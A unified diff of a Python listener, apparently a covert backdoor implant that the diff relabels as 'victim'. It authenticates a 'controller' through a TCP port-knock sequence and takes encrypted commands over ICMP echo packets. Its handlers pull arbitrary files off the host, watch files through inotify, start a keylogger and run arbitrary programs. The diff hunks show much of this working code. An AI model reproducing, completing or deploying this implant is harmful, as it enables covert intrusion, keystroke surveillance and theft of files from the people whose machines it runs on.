@@ -1,9 +1,3 @@
-"""hostb: knock-then-command listener for the remote administration tool.
-
-Usage:
-    sudo python3 hostb.py -i <interface>
-"""
-
 import argparse
 import hashlib
 import os
@@ -43,22 +37,19 @@ ACK_CHUNK = 0xFFFC
 ACK_END = 0xFFFB
 WATCH_STOP = 0xFFF7
 
-# Watch settings.
-WATCH_TIMEOUT_SECONDS = 600.0          # 10-minute hard ceiling per watch session
+WATCH_TIMEOUT_SECONDS = 600.0     
 
 RECEIVED_DIRECTORY = "received"
 RECEIVED_FALLBACK_NAME = "received_file"
 FILE_TRANSFER_TIMEOUT_SECONDS = 10.0
 
-# File transfer: chunked stop-and-wait protocol (matches hosta).
 CHUNK_PACKETS = 1024
 CHUNK_BYTES = CHUNK_PACKETS * 2
 METADATA_TIMEOUT_SECONDS = 10.0
 CHUNK_RECV_TIMEOUT_SECONDS = 10.0
 END_DRAIN_TIMEOUT_SECONDS = 3.0
-RECV_BUFFER_BYTES = 8 * 1024 * 1024       # fat recv buffer to absorb chunk bursts
+RECV_BUFFER_BYTES = 8 * 1024 * 1024      
 
-# Reserved sequence values matching hosta.
 CHUNK_HEADER_SEQ = 0
 END_SEQ = 0xFFFF
 META_FILENAME_LENGTH_SEQ = 1
@@ -66,27 +57,20 @@ META_FILE_SIZE_HI_SEQ = 2
 META_FILE_SIZE_LO_SEQ = 3
 META_FILENAME_FIRST_SEQ = 4
 
-# Byte-stream metadata (run-program command and output): just the 32-bit size.
 STREAM_SIZE_HI_SEQ = 1
 STREAM_SIZE_LO_SEQ = 2
 
-# Chunk-send pacing on the sender side (matches hosta CHUNK_PACKET_DELAY_SECONDS).
 CHUNK_PACKET_DELAY_SECONDS = 0.0001
 META_ACK_TIMEOUT_SECONDS = 5.0
 CHUNK_ACK_TIMEOUT_SECONDS = 5.0
 END_ACK_TIMEOUT_SECONDS = 3.0
 MAX_CHUNK_RETRIES = 5
 
-# Run-program limits.
-MAX_OUTPUT_BYTES = 0xFFFFFFFF                # 32-bit size header lifts the old 64KB cap
+MAX_OUTPUT_BYTES = 0xFFFFFFFF             
 SUBPROCESS_TIMEOUT_SECONDS = 30.0
 
-# Outbound file (option 5: hosta requests a file from hostb): same 4GB protocol cap.
 MAX_OUTBOUND_FILE_BYTES = 0xFFFFFFFF
 
-# Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
-# 0x10..0x3F filler pattern. hosta ignores this payload — it only reads
-# the identifier and sequence header fields.
 PING_PAYLOAD = b"\x00" * 8 + bytes(range(0x10, 0x40))
 
 BPF_KNOCK = (
@@ -98,14 +82,14 @@ BPF_COMMAND = "icmp[icmptype] = icmp-echo"
 
 
 @dataclass
-class HostbArgs:
+class VictimArgs:
     iface: str | None
     key: str
 
 
 @dataclass
 class Context:
-    args: HostbArgs | None = None
+    args: VictimArgs | None = None
     error_message: str | None = None
     error_code: int = 1
     iface: str | None = None
@@ -121,9 +105,8 @@ class KnockProgress:
     sequence_started_at: float
 
 
-# ---------------------------------------------------------------------------
 # Protocol helpers
-# ---------------------------------------------------------------------------
+
 
 def detect_source_ip(destination_ip):
     probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -148,11 +131,11 @@ def build_ip_header(source_ip, destination_ip, total_length, protocol=socket.IPP
     def with_checksum(checksum):
         return struct.pack(
             "!BBHHHBBH4s4s",
-            0x45,                     # version 4, header length 5 (20 bytes)
-            0,                        # type of service
+            0x45,                     
+            0,                        
             total_length,
-            0,                        # identification
-            0,                        # flags + fragment offset
+            0,                        
+            0,                      
             TTL,
             protocol,
             checksum,
@@ -168,13 +151,13 @@ def build_tcp_syn_header(source_ip, destination_ip):
             "!HHLLBBHHH",
             ACK_SOURCE_PORT,
             ACK_DESTINATION_PORT,
-            0,                        # sequence number
-            1,                        # ack number
-            0x50,                     # data offset 5 (20 bytes), reserved 0
-            0x02,                     # flags: ACK only
-            65535,                    # window
+            0,                       
+            1,                       
+            0x50,                   
+            0x02,                  
+            65535,                  
             checksum,
-            0,                        # urgent pointer
+            0,                       
         )
     pseudo = struct.pack(
         "!4s4sBBH",
@@ -182,7 +165,7 @@ def build_tcp_syn_header(source_ip, destination_ip):
         socket.inet_aton(destination_ip),
         0,
         socket.IPPROTO_TCP,
-        20,                           # TCP header length
+        20,                         
     )
     return with_checksum(compute_checksum(pseudo + with_checksum(0)))
 
@@ -191,8 +174,8 @@ def build_icmp_echo_request(identifier_encrypted, sequence):
     def with_checksum(checksum):
         header = struct.pack(
             "!BBHHH",
-            8,                         # type: echo request
-            0,                         # code
+            8,                        
+            0,                        
             checksum,
             identifier_encrypted,
             sequence,
@@ -263,7 +246,6 @@ class KnockWatcher:
             next_knock_index = progress.knocks_received if progress else 0
             already_accepted_ports = KNOCK_PORTS[:next_knock_index]
 
-            # Loopback can deliver the same SYN twice; ignore the echo.
             if progress and destination_port in already_accepted_ports:
                 return
 
@@ -305,7 +287,7 @@ class CommandWatcher:
         if packet[IP].src != self.expected_source:
             return
         icmp = packet[ICMP]
-        if int(icmp.type) != 8:  # echo request only
+        if int(icmp.type) != 8: 
             return
 
         encrypted = int(icmp.id) & 0xFFFF
@@ -385,7 +367,7 @@ def _read_icmp_echo(recv_socket, source_ip, remaining):
     except socket.timeout:
         return None
     if len(packet) < 28:
-        return ()  # malformed; caller should keep waiting
+        return () 
     ip_header_length = (packet[0] & 0x0F) * 4
     if len(packet) < ip_header_length + 8:
         return ()
@@ -490,7 +472,6 @@ def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
                 for i in range(1, expected_packets + 1):
                     v = packets.get(i)
                     if v is None:
-                        # Should not happen because the count check passed.
                         return None, expected_packets - len(packets)
                     out.append((v >> 8) & 0xFF)
                     out.append(v & 0xFF)
@@ -499,7 +480,7 @@ def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
 
 def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_written, timeout):
     """After the final chunk is written, keep listening briefly for the END marker
-    and re-ACK any duplicate chunk headers from in-flight hosta retries."""
+    and re-ACK any duplicate chunk headers from in-flight controller retries."""
     deadline = time.time() + timeout
     while True:
         remaining = deadline - time.time()
@@ -518,7 +499,7 @@ def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_writte
 
 
 def _send_watch_event_line(send_socket, source_ip, dest_ip, key, line):
-    """Send one inotify event line to hosta with no ACK (fire-and-forget).
+    """Send one inotify event line to controller with no ACK (fire-and-forget).
     seq=0 carries the byte length; seq=1..N carry 2 bytes of UTF-8 text each."""
     text = line.encode("utf-8")
     n = len(text)
@@ -533,8 +514,8 @@ def _send_watch_event_line(send_socket, source_ip, dest_ip, key, line):
 
 
 def _watch_and_stream(ctx: Context, recursive: bool):
-    """Receive the path to watch from hosta, start inotify, and stream events back
-    until hosta sends WATCH_STOP or WATCH_TIMEOUT_SECONDS elapses."""
+    """Receive the path to watch from controller, start inotify, and stream events back
+    until controller sends WATCH_STOP or WATCH_TIMEOUT_SECONDS elapses."""
     try:
         from inotify_simple import INotify, flags as iflags
     except ImportError:
@@ -542,7 +523,6 @@ def _watch_and_stream(ctx: Context, recursive: bool):
         return
 
     if recursive:
-        # Directory watch: track what changes inside the folder plus the folder itself.
         watch_flags = (
             iflags.CREATE | iflags.DELETE |
             iflags.MOVED_FROM | iflags.MOVED_TO |
@@ -562,7 +542,6 @@ def _watch_and_stream(ctx: Context, recursive: bool):
             (iflags.MOVE_SELF,    "MOVE_SELF"),
         ]
     else:
-        # File watch: track reads, writes, metadata changes, and the file's own fate.
         watch_flags = (
             iflags.OPEN | iflags.ACCESS |
             iflags.MODIFY | iflags.CLOSE_WRITE | iflags.CLOSE_NOWRITE |
@@ -623,13 +602,11 @@ def _watch_and_stream(ctx: Context, recursive: bool):
                 for d in dirs:
                     inotify.add_watch(os.path.join(root, d), watch_flags)
 
-        print(f"[WATCH] watching — send stop from hosta or wait {WATCH_TIMEOUT_SECONDS}s")
+        print(f"[WATCH] watching — send stop from controller or wait {WATCH_TIMEOUT_SECONDS}s")
         deadline = time.time() + WATCH_TIMEOUT_SECONDS
         inotify_fd = inotify.fileno()
 
         while time.time() < deadline and not ctx.stop_requested.is_set():
-            # Wait on BOTH the raw socket (WATCH_STOP) and the inotify fd (fs events)
-            # so either one wakes the loop immediately instead of polling.
             remaining = min(1.0, deadline - time.time())
             try:
                 readable, _, _ = select.select([recv_socket, inotify_fd], [], [], remaining)
@@ -637,7 +614,6 @@ def _watch_and_stream(ctx: Context, recursive: bool):
                 break
 
             if recv_socket in readable:
-                # Drain all queued packets so WATCH_STOP isn't buried behind others.
                 stop_received = False
                 while True:
                     r, _, _ = select.select([recv_socket], [], [], 0)
@@ -790,9 +766,8 @@ def receive_byte_stream_chunked(recv_socket, send_socket, my_ip, peer_ip, key, m
     return bytes(output)
 
 
-# ---------------------------------------------------------------------------
 # FSM state functions
-# ---------------------------------------------------------------------------
+
 
 def handle_error(ctx: Context):
     sys.stderr.write(f"\nError: {ctx.error_message}\n")
@@ -802,7 +777,7 @@ def handle_error(ctx: Context):
 
 def parse_arguments(ctx: Context, argv: list[str] | None = None):
     parser = argparse.ArgumentParser(
-        prog="hostb",
+        prog="victim",
         description="Knock-then-command listener for the remote administration tool.",
     )
     parser.add_argument("-i", "--interface", dest="iface", required=False,
@@ -810,13 +785,13 @@ def parse_arguments(ctx: Context, argv: list[str] | None = None):
                         help="network interface to sniff on (default: scapy default)")
     parser.add_argument("-k", "--key", dest="key", required=True,
                         metavar="<key>",
-                        help="pre-shared key string (must match hosta)")
+                        help="pre-shared key string (must match controller)")
     try:
         parsed = parser.parse_args(argv)
     except SystemExit as exc:
         sys.exit(1 if exc.code else 0)
 
-    ctx.args = HostbArgs(iface=parsed.iface, key=parsed.key)
+    ctx.args = VictimArgs(iface=parsed.iface, key=parsed.key)
 
 
 def handle_arguments(ctx: Context):
@@ -830,11 +805,11 @@ def handle_arguments(ctx: Context):
 
 
 def wait_for_session(ctx: Context):
-    result: dict[str, str | None] = {"hosta_ip": None}
+    result: dict[str, str | None] = {"controller_ip": None}
     done = threading.Event()
 
-    def on_authenticated(hosta_ip):
-        result["hosta_ip"] = hosta_ip
+    def on_authenticated(controller_ip):
+        result["controller_ip"] = controller_ip
         done.set()
 
     watcher = KnockWatcher(on_authenticated)
@@ -853,7 +828,7 @@ def wait_for_session(ctx: Context):
         if sniffer.running:
             sniffer.stop(join=True)
 
-    ctx.connected_to = result["hosta_ip"]
+    ctx.connected_to = result["controller_ip"]
 
 
 def establish_session(ctx: Context):
@@ -916,8 +891,6 @@ def receive_file(ctx: Context):
 
     source_ip = detect_source_ip(ctx.connected_to)
 
-    # Open the raw recv socket BEFORE sending ACK_READY so we don't miss
-    # the first metadata packets that arrive right after hosta sees the ack.
     try:
         recv_socket = open_raw_icmp_recv_socket()
         send_socket = open_raw_send_socket()
@@ -928,7 +901,6 @@ def receive_file(ctx: Context):
     output_path: str | None = None
     file_handle = None
     try:
-        # Phase B: signal ready, then collect metadata.
         try:
             send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
         except OSError as exc:
@@ -970,7 +942,6 @@ def receive_file(ctx: Context):
             handle_error(ctx)
         print(f"[ACK_META] sent; receiving file -> {output_path}")
 
-        # Phase C: chunk loop.
         if file_size == 0:
             total_chunks = 0
         else:
@@ -1010,7 +981,6 @@ def receive_file(ctx: Context):
             print(f"[FILE] chunk {chunk_index + 1}/{total_chunks} written and acked "
                   f"({chunk_byte_count} bytes)")
 
-        # Phase D: drain window for END marker and stray retransmits.
         drain_for_end(recv_socket, send_socket, ctx.connected_to, source_ip,
                       ctx.key, chunks_written, END_DRAIN_TIMEOUT_SECONDS)
 
@@ -1027,7 +997,7 @@ def receive_file(ctx: Context):
 def send_file(ctx: Context):
     """Handle CMD_REQUEST_FILE: receive the requested path, read the file,
     stream the bytes back via the chunked protocol. An empty stream signals
-    'not found / unreadable' to hosta."""
+    'not found / unreadable' to controller."""
     if not ctx.connected_to:
         return
 
@@ -1041,7 +1011,6 @@ def send_file(ctx: Context):
         handle_error(ctx)
 
     try:
-        # Phase A: signal ready to receive the path.
         try:
             send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
         except OSError as exc:
@@ -1050,7 +1019,6 @@ def send_file(ctx: Context):
             handle_error(ctx)
         print(f"[ACK_READY] sent to {ctx.connected_to}")
 
-        # Phase B: receive the requested path.
         path_bytes = receive_byte_stream_chunked(
             recv_socket, send_socket, source_ip, ctx.connected_to,
             ctx.key, METADATA_TIMEOUT_SECONDS,
@@ -1062,9 +1030,8 @@ def send_file(ctx: Context):
             requested_path = path_bytes.decode("utf-8")
         except UnicodeDecodeError:
             requested_path = path_bytes.decode("utf-8", errors="replace")
-        print(f"[SEND] hosta requested: {requested_path!r}")
+        print(f"[SEND] controller requested: {requested_path!r}")
 
-        # Phase C: read the file. Empty payload signals failure to hosta.
         try:
             with open(requested_path, "rb") as f:
                 file_bytes = f.read()
@@ -1108,11 +1075,11 @@ def run_kl(ctx: Context):
         return
 
     try:
-        import keys  # Import the module to modify its global variable
+        import keys  
         from keys import list_devices_for_remote, start_logger
 
         device_list_text, devices = list_devices_for_remote()
-        print(f"[KL] Sending {len(devices)} keyboard options to hosta...")
+        print(f"[KL] Sending {len(devices)} keyboard options to controller...")
 
         send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
 
@@ -1217,8 +1184,6 @@ def run_program(ctx: Context):
 
     source_ip = detect_source_ip(ctx.connected_to)
 
-    # Open raw recv socket (fat buffer) BEFORE sending ACK_READY so we don't
-    # miss the first command-metadata packets.
     try:
         recv_socket = open_raw_icmp_recv_socket()
         send_socket = open_raw_send_socket()
@@ -1282,7 +1247,7 @@ def run_program(ctx: Context):
 
 
 if __name__ == "__main__":
-    print("--------------- HOSTB ---------------")
+    print("--------------- VICTIM ---------------")
     ctx = Context()
     parse_arguments(ctx)
     handle_arguments(ctx)
